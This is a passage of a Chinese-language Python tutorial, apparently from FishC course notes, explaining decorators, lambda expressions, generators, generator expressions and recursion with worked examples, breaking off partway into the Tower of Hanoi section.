<p>请看下面代码：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import time</span><br><span class="line">    </span><br><span class="line">def time_master(func):</span><br><span class="line">    def call_func():</span><br><span class="line">        print(&quot;开始运行程序...&quot;)</span><br><span class="line">        start = time.time()</span><br><span class="line">        func()</span><br><span class="line">        stop = time.time()</span><br><span class="line">        print(&quot;结束程序运行...&quot;)</span><br><span class="line">        print(f&quot;一共耗费了 &#123;(stop-start):.2f&#125; 秒。&quot;)</span><br><span class="line">    return call_func</span><br><span class="line">    </span><br><span class="line">@time_master</span><br><span class="line">def myfunc():</span><br><span class="line">    time.sleep(2)</span><br><span class="line">    print(&quot;I love FishC.&quot;)</span><br><span class="line">    </span><br><span class="line">myfunc()</span><br></pre></td></tr></table></figure><br>程序实现如下：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">开始运行程序...</span><br><span class="line">I love FishC.</span><br><span class="line">结束程序运行...</span><br><span class="line">一共耗费了 2.01 秒</span><br></pre></td></tr></table></figure></p>
<p>使用了装饰器，我们并不需要修改原来的代码，只需要在函数的上方加上一个 @time_master，然后函数就能够实现统计运行时间的功能了。</p>
<p>这个 <code>@</code>加上装饰器名字其实是个语法糖，装饰器原本的样子应该这么调用的：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import time</span><br><span class="line">    </span><br><span class="line">def time_master(func):</span><br><span class="line">    def call_func():</span><br><span class="line">        print(&quot;开始运行程序...&quot;)</span><br><span class="line">        start = time.time()</span><br><span class="line">        func()</span><br><span class="line">        stop = time.time()</span><br><span class="line">        print(&quot;结束程序运行...&quot;)</span><br><span class="line">        print(f&quot;一共耗费了 &#123;(stop-start):.2f&#125; 秒。&quot;)</span><br><span class="line">    return call_func</span><br><span class="line">    </span><br><span class="line">def myfunc():</span><br><span class="line">    time.sleep(2)</span><br><span class="line">    print(&quot;I love FishC.&quot;)</span><br><span class="line">    </span><br><span class="line">myfunc = time_master(myfunc)</span><br><span class="line">myfunc()</span><br></pre></td></tr></table></figure><br>这个就是装饰器的实现原理啦~</p>
<p>多个装饰器也可以用在同一个函数上：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">def add(func):</span><br><span class="line">    def inner():</span><br><span class="line">        x = func()</span><br><span class="line">        return x + 1</span><br><span class="line">    return inner</span><br><span class="line">    </span><br><span class="line">def cube(func):</span><br><span class="line">    def inner():</span><br><span class="line">        x = func()</span><br><span class="line">        return x * x * x</span><br><span class="line">    return inner</span><br><span class="line">    </span><br><span class="line">def square(func):</span><br><span class="line">    def inner():</span><br><span class="line">        x = func()</span><br><span class="line">        return x * x</span><br><span class="line">    return inner</span><br><span class="line">    </span><br><span class="line">@add</span><br><span class="line">@cube</span><br><span class="line">@square</span><br><span class="line">def test():</span><br><span class="line">    return 2</span><br><span class="line">    </span><br><span class="line">print(test())</span><br></pre></td></tr></table></figure><br>程序实现如下：<br><code>65</code></p>
<p>这样的话，就是先计算平方（square 装饰器），再计算立方（cube 装饰器），最后再加 1（add 装饰器）。</p>
<p>如何给装饰器传递参数呢？<br>答案是添加多一层嵌套函数来传递参数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import time</span><br><span class="line">    </span><br><span class="line">def logger(msg):</span><br><span class="line">    def time_master(func):</span><br><span class="line">        def call_func():</span><br><span class="line">            start = time.time()</span><br><span class="line">            func()</span><br><span class="line">            stop = time.time()</span><br><span class="line">            print(f&quot;[&#123;msg&#125;]一共耗费了 &#123;(stop-start):.2f&#125;&quot;)</span><br><span class="line">        return call_func</span><br><span class="line">    return time_master</span><br><span class="line">    </span><br><span class="line">@logger(msg=&quot;A&quot;)</span><br><span class="line">def funA():</span><br><span class="line">    time.sleep(1)</span><br><span class="line">    print(&quot;正在调用funA...&quot;)</span><br><span class="line">    </span><br><span class="line">@logger(msg=&quot;B&quot;)</span><br><span class="line">def funB():</span><br><span class="line">    time.sleep(1)</span><br><span class="line">    print(&quot;正在调用funB...&quot;)</span><br><span class="line">    </span><br><span class="line">funA()</span><br><span class="line">funB()</span><br></pre></td></tr></table></figure>
<p>程序实现如下：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">正在调用funA...</span><br><span class="line">[A]一共耗费了 1.01</span><br><span class="line">正在调用funB...</span><br><span class="line">[B]一共耗费了 1.04</span><br></pre></td></tr></table></figure></p>
<p>我们将语法糖去掉，拆解成原来的样子，你就知道原理了：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import time</span><br><span class="line">    </span><br><span class="line">def logger(msg):</span><br><span class="line">    def time_master(func):</span><br><span class="line">        def call_func():</span><br><span class="line">            start = time.time()</span><br><span class="line">            func()</span><br><span class="line">            stop = time.time()</span><br><span class="line">            print(f&quot;[&#123;msg&#125;]一共耗费了 &#123;(stop-start):.2f&#125;&quot;)</span><br><span class="line">        return call_func</span><br><span class="line">    return time_master</span><br><span class="line">    </span><br><span class="line">def funA():</span><br><span class="line">    time.sleep(1)</span><br><span class="line">    print(&quot;正在调用funA...&quot;)</span><br><span class="line">    </span><br><span class="line">def funB():</span><br><span class="line">    time.sleep(1)</span><br><span class="line">    print(&quot;正在调用funB...&quot;)</span><br><span class="line">    </span><br><span class="line">funA = logger(msg=&quot;A&quot;)(funA)</span><br><span class="line">funB = logger(msg=&quot;B&quot;)(funB)</span><br><span class="line">    </span><br><span class="line">funA()</span><br><span class="line">funB()</span><br></pre></td></tr></table></figure><br>程序实现如下：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">正在调用funA...</span><br><span class="line">[A]一共耗费了 1.02</span><br><span class="line">正在调用funB...</span><br><span class="line">[B]一共耗费了 1.01</span><br></pre></td></tr></table></figure></p>
<p>这里其实就是给它裹多一层嵌套函数上去，然后通过最外层的这个函数来传递装饰器的参数。<br>这样，logger(msg=”A”) 得到的是 timemaster() 函数的引用，然后再调用一次，并传入 funA，也就是这个 logger(msg=”A”)(funA)，得到的就是 call_func() 函数的引用，最后将它赋值回 funA()。</p>
<p>咱们对比一下没有参数的描述器，这里其实就是添加了一次调用，然后通过这次调用将参数给传递进去而已。</p>
<h3 id="14-22-1-lambda-表达式"><a href="#14-22-1-lambda-表达式" class="headerlink" title="14.22.1 lambda 表达式"></a>14.22.1 lambda 表达式</h3><p>lambda 表达式，也就是大牛们津津乐道的匿名函数。<br>只要掌握了 lambda 表达式，你也就掌握了一行流代码的核心 —— 仅使用一行代码，就能解决一件看起来相当复杂的事情。<br>它的语法是这样的：</p>
<p><code>lambda arg1, arg2, arg3, ... argN : expression</code></p>
<p>lambda 是个关键字，然后是冒号，冒号左边是传入函数的参数，冒号后边是函数实现表达式以及返回值。<br>我们可以将 lambda 表达式的语法理解为一个极致精简之后的函数，如果使用传统的函数定义方式，应该是这样：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def &lt;lambda&gt;(arg1, arg2, arg3, ... argN):</span><br><span class="line">...     return expression</span><br></pre></td></tr></table></figure>
<p>如果要求我们编写一个函数，让它求出传入参数的平方值，以前我们这么写：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; def squareX(x):</span><br><span class="line">...     return x * x</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; squareX(3)</span><br><span class="line">9</span><br></pre></td></tr></table></figure>
<p>现在我们这么写：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; squareY = lambda y : y * y</span><br><span class="line">&gt;&gt;&gt; squareY(3)</span><br><span class="line">9</span><br></pre></td></tr></table></figure>
<p>传统定义的函数，函数名就是一个函数的引用：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; squareX</span><br><span class="line">&lt;function squareX at 0x0000015E06668F70&gt;</span><br></pre></td></tr></table></figure>
<p>而 lambda 表达式，整个表达式就是一个函数的引用：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; squareY</span><br><span class="line">&lt;function &lt;lambda&gt; at 0x0000015E06749EE0&gt;</span><br></pre></td></tr></table></figure>
<h4 id="14-22-2lambda-表达式的优势"><a href="#14-22-2lambda-表达式的优势" class="headerlink" title="14.22.2lambda 表达式的优势"></a>14.22.2lambda 表达式的优势</h4><p>lambda 是一个表达式，因此它可以用在常规函数不可能存在的地方：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; y = [lambda x : x * x, 2, 3]</span><br><span class="line">&gt;&gt;&gt; y[0](y[1])</span><br><span class="line">4</span><br><span class="line">&gt;&gt;&gt; y[0](y[2])</span><br><span class="line">9</span><br></pre></td></tr></table></figure>
<p><strong>注意：这里说的是将整个函数的定义过程都放到列表中哦~</strong></p>
<h4 id="14-22-3-与-map-和-filter-函数搭配使用"><a href="#14-22-3-与-map-和-filter-函数搭配使用" class="headerlink" title="14.22.3 与 map() 和 filter() 函数搭配使用"></a>14.22.3 与 map() 和 filter() 函数搭配使用</h4><p>利用 lambda 表达式与 map() 和 filter() 函数搭配使用，会使代码显得更加 Pythonic：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;  list(mapped = map(lambda x : ord(x) + 10, &quot;FishC&quot;))</span><br><span class="line">[80, 115, 125, 114, 77]</span><br><span class="line">&gt;&gt;&gt; list(filter(lambda x : x % 2, range(10)))</span><br><span class="line">[1, 3, 5, 7, 9]</span><br></pre></td></tr></table></figure></p>
<h4 id="14-22-4-总结"><a href="#14-22-4-总结" class="headerlink" title="14.22.4 总结"></a>14.22.4 总结</h4><p>lambda 是一个表达式，而非语句，所以它能够出现在 Python 语法不允许 def 语句出现的地方，这是它的最大优势。<br>但由于所有的功能代码都局限在一个表达式中实现，因此，lambda 通常只能实现那些较为简单的需求。<br>当然，Python 肯定是有意这么设计的，让 lambda 去做那些简单的事情，我们就不用花心思去考虑这个函数叫什么，那个函数叫什么……def 语句则负责用于定义功能复杂的函数，去处理那些复杂的工作。</p>
<h3 id="14-23-生成器"><a href="#14-23-生成器" class="headerlink" title="14.23 生成器"></a>14.23 生成器</h3><p>在 Python 中，使用了 yield 语句的函数被称为生成器（generator）。</p>
<p>与普通函数不同的是，生成器是一个返回生成器对象的函数，它只能用于进行迭代操作，更简单的理解是 —— 生成器就是一个特殊的迭代器。在调用生成器运行的过程中，每次遇到 yield 时函数会暂停并保存当前所有的运行信息，返回 yield 的值, 并在下一次执行 yield 方法时从当前位置继续运行。定义一个生成器，很简单，就是在函数中，使用 yield 表达式代替 return 语句即可。<br>举个例子：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; def counter():</span><br><span class="line">...     i = 0</span><br><span class="line">...     while i &lt;= 5:</span><br><span class="line">...         yield i</span><br><span class="line">...         i += 1</span><br></pre></td></tr></table></figure></p>
<p>现在我们调用 counter() 函数，得到的不是一个返回值，而是一个生成器对象：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; counter()</span><br><span class="line">&lt;generator object counter at 0x0000025835D0D5F0&gt;</span><br></pre></td></tr></table></figure></p>
<p>我们可以把它放到一个 for 语句中：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; for i in counter():</span><br><span class="line">...     print(i)</span><br><span class="line">... </span><br><span class="line">0</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td></tr></table></figure><br><strong>注意：生成器不像列表、元组这些可迭代对象，你可以把生成器看作是一个制作机器，它的作用就是每调用一次提供一个数据，并且会记住当时的状态。而列表、元组这些可迭代对象是容器，它们里面存放着早已准备好的数据。</strong></p>
<p>生成器可以看作是一种特殊的迭代器，因为它首先是 “不走回头路”，第二是支持 next() 函数：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; c = counter()</span><br><span class="line">&gt;&gt;&gt; next(c)</span><br><span class="line">0</span><br><span class="line">&gt;&gt;&gt; next(c)</span><br><span class="line">1</span><br><span class="line">&gt;&gt;&gt; next(c)</span><br><span class="line">2</span><br><span class="line">&gt;&gt;&gt; next(c)</span><br><span class="line">3</span><br><span class="line">&gt;&gt;&gt; next(c)</span><br><span class="line">4</span><br><span class="line">&gt;&gt;&gt; next(c)</span><br><span class="line">5</span><br><span class="line">next(c)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;pyshell#51&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">    next(c)</span><br><span class="line">StopIteration</span><br></pre></td></tr></table></figure></p>
<p>当没有任何元素产出的时候，它就会抛出一个 “<code>StopIteration</code>” 异常。<br>由于生成器每调用一次获取一个结果这样的特性，导致生成器对象是无法使用下标索引这样的随机访问方式：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; c = counter()</span><br><span class="line">&gt;&gt;&gt; c[2]</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;pyshell#53&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">    c[2]</span><br><span class="line">TypeError: &#x27;generator&#x27; object is not subscriptable</span><br></pre></td></tr></table></figure></p>
<p>使用生成器来求出斐波那契数列：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; def fib():</span><br><span class="line">...     back1, back2 = 0, 1</span><br><span class="line">...     while True:</span><br><span class="line">...         yield back1</span><br><span class="line">...         back1, back2 = back2, back1 + back2</span><br><span class="line">... </span><br><span class="line">&gt;&gt;&gt; f = fib()</span><br><span class="line">&gt;&gt;&gt; next(f)</span><br><span class="line">0</span><br><span class="line">&gt;&gt;&gt; next(f)</span><br><span class="line">1</span><br><span class="line">&gt;&gt;&gt; next(f)</span><br><span class="line">1</span><br><span class="line">&gt;&gt;&gt; next(f)</span><br><span class="line">2</span><br><span class="line">&gt;&gt;&gt; next(f)</span><br><span class="line">3</span><br><span class="line">&gt;&gt;&gt; next(f)</span><br><span class="line">5</span><br><span class="line">&gt;&gt;&gt; next(f)</span><br><span class="line">8</span><br><span class="line">&gt;&gt;&gt; next(f)</span><br><span class="line">13</span><br><span class="line">&gt;&gt;&gt; next(f)</span><br><span class="line">21</span><br></pre></td></tr></table></figure><br>只要我们调用 next(f)，就可以继续生成一个新的斐波那契数，由于我们在函数中没有设置结束条件，那么这样我们就得到了一个永恒的斐波那契数列生成器，薪火相传、生生不息。</p>
<h3 id="14-24-生成器表达式"><a href="#14-24-生成器表达式" class="headerlink" title="14.24 生成器表达式"></a>14.24 生成器表达式</h3><p>其实在前面讲解元组的时候，小甲鱼就给大家预告了这一章节的到来。<br>因为列表有推导式，元组则没有，如果非要这么写：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; (i ** 2 for i in range(10))</span><br><span class="line">&lt;generator object &lt;genexpr&gt; at 0x0000019A976CC5F0&gt;</span><br></pre></td></tr></table></figure>
<p>那么我们可以看到，它其实就是得到一个生成器嘛：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; t = (i ** 2 for i in range(10))</span><br><span class="line">&gt;&gt;&gt; next(t)</span><br><span class="line">0</span><br><span class="line">&gt;&gt;&gt; next(t)</span><br><span class="line">1</span><br><span class="line">&gt;&gt;&gt; next(t)</span><br><span class="line">4</span><br><span class="line">&gt;&gt;&gt; next(t)</span><br><span class="line">9</span><br><span class="line">&gt;&gt;&gt; next(t)</span><br><span class="line">16</span><br><span class="line">&gt;&gt;&gt; for i in t:</span><br><span class="line">...     print(i)</span><br><span class="line">... </span><br><span class="line">25</span><br><span class="line">36</span><br><span class="line">49</span><br><span class="line">64</span><br><span class="line">81</span><br></pre></td></tr></table></figure><br>这种利用推导的形式获取生成器的方法，我们称之为生成器表达式。</p>
<h3 id="14-25-递归"><a href="#14-25-递归" class="headerlink" title="14.25 递归"></a>14.25 递归</h3><p>递归就是就是函数调用自身的过程，举个例子：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; def funC():</span><br><span class="line">...     print(&quot;AWBDYL&quot;)</span><br><span class="line">...     funC()</span><br><span class="line">... </span><br><span class="line">&gt;&gt;&gt; funC()</span><br><span class="line">AWBDYL</span><br><span class="line">AWBDYL</span><br><span class="line">AWBDYL</span><br><span class="line">AWBDYL</span><br><span class="line">AWBDYL</span><br><span class="line">AWBDYL</span><br><span class="line">AWBDYL</span><br><span class="line">AWBDYL</span><br><span class="line">AWBDYL</span><br><span class="line">AWBDYL</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
<p>上面代码会持续输出 “AWBDYL”，直到你把 IDLE 关闭或者使用 Ctrl + c 快捷键强制中断执行。<br>加上一个条件判断语句，让递归在恰当的时候进行回归，那么失控的局面就得到了控制：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; def funC(i):</span><br><span class="line">...     if i &gt; 0:</span><br><span class="line">...         print(&quot;AWBDYL&quot;)</span><br><span class="line">...         i -= 1</span><br><span class="line">...         funC(i)</span><br><span class="line">... </span><br><span class="line">&gt;&gt;&gt; funC(10)</span><br><span class="line">AWBDYL</span><br><span class="line">AWBDYL</span><br><span class="line">AWBDYL</span><br><span class="line">AWBDYL</span><br><span class="line">AWBDYL</span><br><span class="line">AWBDYL</span><br><span class="line">AWBDYL</span><br><span class="line">AWBDYL</span><br><span class="line">AWBDYL</span><br><span class="line">AWBDYL</span><br></pre></td></tr></table></figure><br>再次强调一下，要让递归正常工作，必须要有一个结束条件，并且每次调用都将向着这个结束条件推进。</p>
<h4 id="14-25-1-使用递归求一个数的阶乘"><a href="#14-25-1-使用递归求一个数的阶乘" class="headerlink" title="14.25.1 使用递归求一个数的阶乘"></a>14.25.1 使用递归求一个数的阶乘</h4><p>一个正整数的阶乘，是指所有小于及等于该数的正整数的积，所以 5 的阶乘是 1×2×3×4×5，结果等于 120。<br>我们先来试试迭代的实现方法：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; def factIter(n):</span><br><span class="line">...     result = n</span><br><span class="line">...     for i in range(1, n):</span><br><span class="line">...         result *= i</span><br><span class="line">...     return result</span><br><span class="line">... </span><br><span class="line">&gt;&gt;&gt; factIter(5)</span><br><span class="line">120</span><br><span class="line">&gt;&gt;&gt; factIter(10)</span><br><span class="line">3628800</span><br></pre></td></tr></table></figure></p>
<p>那么递归来实现的话，代码则是像下面这样：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; def factRecur(n):</span><br><span class="line">...     if n == 1:</span><br><span class="line">...         return 1</span><br><span class="line">...     else:</span><br><span class="line">...         return n * factRecur(n-1)</span><br><span class="line">... </span><br><span class="line">&gt;&gt;&gt; factRecur(5)</span><br><span class="line">120</span><br><span class="line">&gt;&gt;&gt; factRecur(10)</span><br><span class="line">3628800</span><br></pre></td></tr></table></figure></p>
<h3 id="14-25-2-使用递归求斐波那契数列"><a href="#14-25-2-使用递归求斐波那契数列" class="headerlink" title="14.25.2 使用递归求斐波那契数列"></a>14.25.2 使用递归求斐波那契数列</h3><p>斐波那契数列由 0 和 1 开始，之后的斐波那契数就是由之前的两数相加而得出。</p>
<p>首几个斐波那契数是：<br>1、 1、 2、 3、 5、 8、 13、 21、 34、 55、 89、 144、 233、 377、 610、 987……<br>我们先来试试迭代的实现方法：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; def fibIter(n):</span><br><span class="line">...     a = 1</span><br><span class="line">...     b = 1</span><br><span class="line">...     c = 1</span><br><span class="line">...     while n &gt; 2:</span><br><span class="line">...         c = a + b</span><br><span class="line">...         a = b</span><br><span class="line">...         b = c</span><br><span class="line">...         n -= 1</span><br><span class="line">...     return c</span><br><span class="line">... </span><br><span class="line">&gt;&gt;&gt; fibIter(12)</span><br><span class="line">144</span><br></pre></td></tr></table></figure></p>
<p>如果使用递归来实现，代码就是这样的：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; def fibRecur(n):</span><br><span class="line">...     if n == 1 or n == 2:</span><br><span class="line">...         return 1</span><br><span class="line">...     else:</span><br><span class="line">...         return fibRecur(n-1) + fibRecur(n-2)</span><br><span class="line">... </span><br><span class="line">&gt;&gt;&gt; fibRecur(12)</span><br><span class="line">144</span><br></pre></td></tr></table></figure></p>
<h3 id="14-26-1-汉诺塔的故事"><a href="#14-26-1-汉诺塔的故事" class="headerlink" title="14.26.1 汉诺塔的故事"></a>14.26.1 汉诺塔的故事</h3><p>汉诺塔其实是 1883 年的时候，由法国数学家卢卡斯发明的。不过这个游戏呢，与一个古老的印度传说有关：据说在世界中心贝拿勒斯的圣庙里边，有一块黄铜板，上边插着三根宝针。印度教的主神梵天在创造世界的时候，在其中一根针上从下到上地穿好了由大到小的 64 片金片，这就是所谓的汉诺塔原型。然后不论白天还是黑夜，总有一个僧侣按照下面的规则来移动这些金片：“一次只移动一片，不管在哪根针上，小片必须在大片上面。”另外僧侣们预言，当所有的金片都从梵天穿好的那根针上移到另外一根针上时，世界就将在一声霹雳中消灭，而梵塔、 和众生也都将同归于尽。</p>
<h4 id="16-26-2-汉诺塔玩法分解"><a href="#16-26-2-汉诺塔玩法分解" class="headerlink" title="16.26.2 汉诺塔玩法分解"></a>16.26.2 汉诺塔玩法分解</h4><p>对于游戏的玩法，我们可以简单分解为三个步骤：</p>
<ol>
<li>将顶上的 63 个金片从 A 移动到 B</li>
<li>将最底下的第 64 个金片从 A 移动到 C</li>
<li>将 B 上的 63 个金片移动到 C</li>
</ol>
<p>看着跟没说一样……<br>那么先让我们把难度简化为婴儿等级 —— 3 个金片：</p>
<ol>
<li>将顶上的 2 个金片从 A 移动到 B</li>
<li>将最底下的第 3 个金片从 A 移动到 C</li>
